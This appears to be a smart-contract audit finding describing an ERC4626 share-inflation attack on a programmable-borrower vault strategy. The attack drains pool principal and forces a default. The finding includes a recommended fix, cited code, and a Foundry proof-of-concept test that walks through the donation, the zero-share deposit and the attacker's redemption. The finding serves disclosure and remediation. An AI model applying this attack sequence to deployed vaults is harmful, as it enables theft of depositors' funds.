### Title
Unvalidated ERC4626 share-price inflation drains revolving-vault principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` trusts an arbitrary ERC4626 vault's instantaneous share price. An unprivileged vault user can inflate `assets / shares` before `startEpoch`, causing the borrower's deposit to mint zero or dust shares while transferring the full pool principal into the vault. The attacker then redeems their previously created shares and exits with the pool's assets.

### Finding Description
`ProgrammableBorrower.initialize` and `setVault` only check that the configured vault's `asset()` matches the credit-vault underlying; they do not require initialized liquidity, inflation-resistant decimals, or a minimum share price. [1](#0-0) [2](#0-1) 

At `startEpoch`, `onStartEpoch` snapshots the pre-deposit value and deposits the borrower's entire on-hand underlying balance through `_depositToVault`. [3](#0-2)  `_depositToVault` records the ERC4626 share amount only in an event and never checks that `shares > 0` or that `convertToAssets(shares)` approximately equals the deposited assets. [4](#0-3) 

An attacker can therefore initialize an empty proportional-share ERC4626 vault with one wei, donate enough underlying to make one share worth more than the upcoming pool deposit, and let `vault.deposit(poolAssets, programmableBorrower)` round the borrower's minted shares down to zero. The vault receives the principal, while `_currentVaultAssets()` reports zero for the borrower. [5](#0-4) 

The resulting vault loss only floors `totalInterestDueNow()` at zero; it does not burn the CDO's `IdleCreditVault` strategy tokens. [6](#0-5)  The CDO continues valuing those strategy tokens 1:1 in `getContractValue`, leaving LP tranches marked at par although the external principal was already extracted. [7](#0-6) 

### Impact Explanation
This is direct theft and eventual insolvency. With a pool deposit `P`, the attacker can donate approximately `P`, force the borrower to receive zero shares for its `P` deposit, and redeem the attacker's single vault share for approximately `2P`, for a profit near `P` before vault fees and rounding.

The CDO does not realize the principal loss when it happens because credit-vault NAV is based on the CDO-held `IdleCreditVault` token balance rather than the programmable borrower's recoverable external-vault assets. Once a lender creates a withdrawal receipt, the next `stopEpoch` asks the borrower for `pendingWithdraws`; the empty borrower cannot satisfy the transfer and `_handleBorrowerDefault` marks the pool defaulted. [8](#0-7) [9](#0-8) 

### Likelihood Explanation
The attack requires the honest owner to configure an empty or very-low-supply ERC4626 vault whose `deposit` rounds share issuance downward and does not revert on zero shares. `setVault` and initialization do not prevent this configuration. [2](#0-1) 

The attacker needs no privileged role: they only deposit into and redeem from the external ERC4626 vault before the honest manager calls `startEpoch`. No timing race inside the same transaction is needed because the inflated share price can be established before `startEpoch`.

### Recommendation
Validate ERC4626 deposits with an explicit minimum share/value check:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
uint256 realizedAssets = vault.convertToAssets(shares);
if (shares == 0 || realizedAssets < _assetAmount - maxDepositSlippage) {
    revert InvalidAmount();
}
```

Additionally, require configured vaults to have inflation-resistant accounting and minimum initialized liquidity, or seed vault liquidity through a trusted bootstrap flow before allowing pool deposits. `setVault` should enforce these criteria rather than checking only `asset()`.

### Proof of Concept
A Foundry reproduction can use the existing programmable-borrower fixture and replace the Morpho vault with this deliberately minimal, non-malicious proportional ERC4626 vault:

```solidity
// test/foundry/ProgrammableBorrowerShareInflation.t.sol
contract InflationProne4626 is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Inflation Vault", "IVLT") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = assets * totalSupply() / assetToken.balanceOf(address(this));
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}
```

The attack flow is:

```solidity
function testShareInflationDrainsEpochPrincipal() public {
    uint256 poolAssets = 10_000 * oneScale;
    address attacker = makeAddr("attacker");

    InflationProne4626 spotVault = new InflationProne4626(USDC);
    // Initialize ProgrammableBorrower with spotVault in the existing fixture.

    deal(USDC, address(this), poolAssets, true);
    underlying.approve(address(cdoEpoch), type(uint256).max);
    idleCDO.depositAA(poolAssets);

    // Attacker makes one share worth more than the upcoming deposit.
    deal(USDC, attacker, poolAssets + 1, true);
    vm.startPrank(attacker);
    underlying.approve(address(spotVault), type(uint256).max);
    spotVault.deposit(1, attacker);
    underlying.transfer(address(spotVault), poolAssets);
    vm.stopPrank();

    // Honest manager starts the epoch; PB deposits poolAssets and receives zero shares.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertEq(spotVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(underlying.balanceOf(address(programmableBorrower)), 0);

    // Attacker redeems the only share for donation + pool principal.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    spotVault.redeem(1, attacker, attacker);
    assertGt(underlying.balanceOf(attacker) - attackerBefore, poolAssets);

    // Stop succeeds with zero minted interest while CDO strategy tokens remain at par.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    assertEq(cdoEpoch.lastEpochInterest(), 0);

    // A withdrawal exposes the missing principal and defaults the pool on the next stop.
    cdoEpoch.requestWithdraw(0, address(aaTranche));
    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);

    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    assertTrue(cdoEpoch.defaulted());
}
```

The decisive assertion is that `spotVault.balanceOf(programmableBorrower) == 0` after `startEpoch` even though the full `poolAssets` transfer occurred; this follows from `_depositToVault` accepting the returned share count without validation. [4](#0-3)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-169)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-220)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-347)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L123-128)
```text
  /// @notice calculates the current net TVL (in `token` terms)
  /// @dev `unclaimedFees` are not counted.
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-405)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```
